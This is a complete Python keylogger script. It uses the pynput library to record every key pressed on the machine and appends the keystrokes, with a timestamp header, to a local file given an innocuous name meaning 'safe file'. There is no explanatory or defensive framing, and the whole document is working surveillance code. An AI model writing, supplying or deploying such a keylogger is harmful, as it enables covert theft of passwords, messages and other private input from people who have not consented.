from pynput.keyboard import Listener
from datetime import datetime

log_file = "bezopasan_file.txt"

with open(log_file, "a") as file:
    datestring = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    file.write("\n" + "-"*30 + " " + datestring + " " + "-"*30 + "\n\n")

def write_to_file(key):
    with open(log_file, "a") as file:
        key = str(key).replace("'", "") 
        if key == "Key.space":
            file.write(" ")  
        elif key == "Key.enter":
            file.write("\n")
        elif key == "Key.backspace":
            file.write("[BACKSPACE]") 
        else:
            file.write(key)
            
with Listener(on_press=write_to_file) as listener:
    listener.join()
